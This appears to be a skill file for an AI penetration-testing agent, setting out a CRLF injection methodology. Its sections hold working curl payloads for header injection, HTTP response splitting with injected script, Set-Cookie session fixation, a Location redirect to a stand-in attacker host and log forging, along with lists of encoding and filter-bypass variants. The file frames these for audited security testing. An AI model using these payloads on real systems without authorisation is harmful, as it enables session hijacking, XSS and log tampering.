---
name: crlf-injection
description: Detect and exploit CRLF injection for HTTP response splitting, header injection, and log forging
origin: Vigil
vuln_class: crlf
---

# CRLF Injection Testing

> **`vigil assess kali` audit flags:** use `--technique OTHER` (CRLF/header-splitting has no dedicated enum class; outcomes span response splitting, cookie injection, and CRLF→XSS).

## When to Activate

- User input appears in HTTP response headers, redirect locations, or logged fields
- Parameters control redirect URLs, custom response headers, or Set-Cookie values
- Log files include user-controlled input without sanitization

## Tools

- `vigil assess kali exec -- curl ...` (manual CRLF injection probing with encoded payloads — all target-facing curl must go through the kali exec wrapper so the request lands in the audit pipeline; use `--technique OTHER --probe-kind payload --phase consume-test --timeout 30`)
- Browser DevTools (inspect injected response headers)
- `vigil oob mint` / `vigil oob poll` — when a CRLF injection lets you split the response and plant a redirecting `Location`, an injected `<script src>`/`<img>` into a poisoned body, or otherwise force a victim's browser to fetch attacker-controlled content, mint a nonce-tagged callback host (`vigil oob mint --technique OTHER --target-url <url> --param <p>`), embed its `http` host in the split payload, then `vigil oob poll --client <name>` returns the matched probe<->callback pair that proves the splice fired. Check readiness with `vigil oob status --json`; if no named client is running, start one with `vigil oob client start <name> --engagement <key> --agent <agent>`. (`vigil oob client logs <name> --lines 80` is a raw listener tail for infra debugging only, not correlation.)

## Methodology

### 1. Identify Injection Points
- [ ] Test redirect parameters: `url=`, `next=`, `return=`, `redirect=`, `dest=`
- [ ] Test parameters reflected in response headers (Set-Cookie, Location, custom headers)
- [ ] Test parameters logged to server-side files (usernames, search queries, User-Agent)

### 2. Basic CRLF Header Injection
- [ ] Inject newline sequences to add arbitrary headers
```bash
curl -v "https://target/redirect?url=https://example.com%0d%0aInjected-Header:injected-value"
curl -v "https://target/redirect?url=https://example.com%0D%0ASet-Cookie:session=attacker"
```
- [ ] Verify injected header appears in response using `-v` or DevTools

### 3. HTTP Response Splitting
- [ ] Inject double CRLF to terminate headers and inject body
```bash
curl -v "https://target/redirect?url=test%0d%0a%0d%0a<html><body>Injected</body></html>"
```
- [ ] Inject a full HTTP response
```bash
curl -v "https://target/page?param=value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
```

### 4. Session Fixation via Set-Cookie Injection
- [ ] Inject Set-Cookie header to fix victim session
```bash
curl -v "https://target/redirect?url=https://target.example%0d%0aSet-Cookie:session=attacker_controlled_value"
curl -v "https://target/redirect?url=https://target.example%0d%0aSet-Cookie:session=abc123;Path=/;HttpOnly"
```

### 5. Location Header Injection
- [ ] Inject Location header for open redirect
```bash
curl -v "https://target/page?param=value%0d%0aLocation:%20https://attacker.example"
```

### 6. Log Injection / Log Forging
- [ ] Inject fake log entries via CRLF in logged parameters
```bash
curl "https://target/login?username=admin%0d%0a[INFO] Login successful for admin from 10.0.0.1"
curl -A "Mozilla/5.0%0d%0a[CRITICAL] Unauthorized access detected" https://target/
```
- [ ] Test if injected log lines could mislead forensic analysis or trigger alerts

### 7. Encoding Variants
- [ ] Standard URL encoding
```
%0d%0a    %0D%0A    %0d%20%0a    %0a    %0d
```
- [ ] Double URL encoding
```
%250d%250a    %250D%250A
```
- [ ] Unicode CRLF sequences
```
%E5%98%8A%E5%98%8D    (UTF-8 sequences that trigger CRLF in certain proxies/parsers — Cer0 research)
%C4%8D%C4%8A          (UTF-8 sequences that trigger CRLF in specific parser implementations)
```
- [ ] Raw characters in contexts that accept them
```
\r\n    \n    \r
```
- [ ] Null byte prefix
```
%00%0d%0a
```

### 8. Filter Bypass Techniques
- [ ] Mixed case and partial encoding
```
%0D%0a    %0d%0A    %0d%0a%20
```
- [ ] Tab and space padding after CRLF
```
%0d%0a%09    %0d%0a%20
```
- [ ] Double CRLF with junk between
```
%0d%0aX-Junk:1%0d%0aInjected:value
```

### 9. HTTP/2 CRLF Injection
- [ ] Test CRLF in pseudo-headers (`:authority`, `:path`)
```bash
curl --http2 -H ":path: /page%0d%0aInjected:value" https://target/
```
- [ ] Test if HTTP/2 to HTTP/1.1 downgrade at proxy preserves injected characters

## What to Record

- Injection point (URL parameter, header, logged field)
- Exact payload including encoding variant that succeeded
- Evidence of injected header in response (curl -v output or DevTools screenshot)
- Impact: session fixation, XSS via response splitting, open redirect, log forging — prove the attacker outcome (`agent/rules/hunting.md` §2), e.g., session cookie replaced to attacker-controlled value enabling session fixation, XSS payload executes in victim browser via poisoned response, Referer-based token leaks via open redirect
- Whether filter bypass was required and which encoding worked
- Full request/response for reproducibility

## Extended Resources

_(none — methodology in skill)_
